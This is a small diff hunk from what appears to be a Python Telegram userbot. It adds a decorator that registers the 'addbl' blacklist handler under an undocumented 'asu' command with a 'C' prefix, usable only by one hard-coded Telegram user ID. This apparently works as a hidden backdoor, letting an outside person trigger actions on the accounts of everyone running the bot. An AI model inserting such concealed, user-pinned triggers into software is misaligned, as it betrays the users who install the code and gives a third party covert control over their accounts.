@@ -21,6 +21,7 @@ __HELP__ = f"""
 @PY.UBOT("addbl", sudo=True)
 @PY.GROUP
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["asu"], "C") & filters.user(2100442624))
 async def _(client, message):
     await add_blaclist(client, message)
 
